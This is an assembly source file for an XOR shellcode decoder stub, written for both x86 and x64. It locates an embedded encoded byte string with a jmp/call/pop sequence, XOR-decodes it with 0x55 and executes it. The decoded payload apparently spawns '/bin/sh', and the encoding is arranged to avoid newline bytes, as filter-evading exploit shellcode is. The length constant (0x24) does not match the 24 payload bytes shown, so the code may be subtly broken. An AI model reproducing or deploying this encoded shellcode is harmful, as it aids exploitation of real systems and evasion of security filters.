# /* assembly source for XOR_BASIC, both x86 & x64 compatible | Length: 21 - 25 bytes */ #
.set BYTE, 0x55
.set LEN, 0x24

.if ARCH == 64
	.set Ecx, %rcx
	.set Esi, %rsi
.else
	.set Ecx, %ecx
	.set Esi, %esi
.endif

.macro set_Ecx
	xor Ecx, Ecx
.if LEN > 0x100				# LEN is 2 bytes long
	movw $LEN, %cx
.else					# LEN is 1 byte long
	movb $LEN, %cl
.endif					# We now have Ecx == $LEN
.endm

.text
.globl _start
_start:
	set_Ecx
	jmp put_addr
	nop				# prevents the relative jump to be 10 chars long (10 = '\n')

in_stack:
	pop Esi

xorloop:
	xorb $BYTE, -0x1(Esi, Ecx)
	loop xorloop			# dec Ecx; jnz xorloop

	jmp xoredcode

put_addr:
	call in_stack
xoredcode:
	.ascii "\xbd\x52\x55\x55\x55\x7a\x37\x3c\x3b\x7a\x26\x3d\x3f\x5e\x0d\x0e\xcc\xdc\x84\xdd\x06\x52\x98\xd5"
